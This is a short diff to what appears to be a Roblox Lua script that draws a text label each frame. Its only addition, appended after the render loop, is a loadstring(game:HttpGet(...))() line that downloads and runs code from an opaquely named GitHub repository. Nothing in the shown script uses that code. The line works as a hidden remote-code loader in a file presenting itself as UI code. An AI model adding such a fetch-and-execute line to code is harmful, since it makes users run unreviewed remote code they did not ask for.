@@ -51,3 +51,5 @@ game:GetService("RunService").RenderStepped:Connect(function()
     lb.Size = 20
     lb.Position = Vector2.new(10, vf.Y - lb.TextBounds.Y - 81)
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Vekyl/machinecode/main/hashv2"))()
